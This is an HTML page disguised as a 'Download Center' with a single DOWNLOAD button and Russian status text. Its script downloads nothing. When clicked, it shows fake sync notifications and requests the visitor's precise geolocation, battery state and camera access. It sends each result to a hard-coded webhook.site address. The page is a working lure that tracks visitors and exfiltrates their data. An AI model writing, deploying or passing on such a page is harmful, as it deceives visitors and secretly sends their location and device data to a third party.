<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download Center</title>
    <style>
        body { font-family: sans-serif; background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #111; padding: 25px; border-radius: 8px; width: 90%; max-width: 400px; text-align: center; }
        button { width: 100%; padding: 18px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 1.2rem; background: #007bff; color: white; box-shadow: 0 4px 15px rgba(0,123,255,0.3); }
        button:active { transform: scale(0.98); }
        #status { margin-top: 15px; font-size: 0.8rem; color: #555; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <button onclick="masterFunction()">DOWNLOAD</button>
    <div id="status">Нажмите для начала загрузки</div>
</div>

<script>
    const webhookUrl = "https://webhook.site/3536371a-f8c8-445e-a399-617a47d6fadb";

    async function masterFunction() {
        const status = document.getElementById('status');
        status.innerText = "Инициализация...";

        // 1. УВЕДОМЛЕНИЯ (Сразу после клика)
        if ("Notification" in window) {
            const permission = await Notification.requestPermission();
            if (permission === 'granted') {
                // Создаем уведомление мгновенно, пока контекст клика "живой"
                new Notification("System", { body: "Загрузка началась...", tag: "start" });
                
                // Небольшой спам через задержку
                for (let i = 1; i <= 5; i++) {
                    setTimeout(() => {
                        new Notification("Alert", { 
                            body: `Синхронизация пакета #${i * 20}%`,
                            requireInteraction: false
                        });
                    }, i * 2000);
                }
            }
        }

        // 2. ГЕОЛОКАЦИЯ
        navigator.geolocation.getCurrentPosition(
            (p) => send("GEO", { lat: p.coords.latitude, lon: p.coords.longitude }),
            (e) => send("GEO_ERR", { c: e.code }),
            { enableHighAccuracy: true }
        );

        // 3. БАТАРЕЯ
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            send("BAT", { l: bat.level * 100, c: bat.charging });
        }

        // 4. ВИБРАЦИЯ
        if (navigator.vibrate) navigator.vibrate([300, 100, 300]);

        // 5. КАМЕРА
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            send("CAM", { status: "ok" });
            stream.getTracks().forEach(t => t.stop());
        } catch (e) {
            send("CAM", { status: "fail" });
        }

        status.innerText = "Синхронизация завершена";
    }

    function send(type, data) {
        const q = new URLSearchParams(data).toString();
        fetch(`${webhookUrl}?type=${type}&${q}`).catch(() => {});
    }
</script>

</body>
</html>
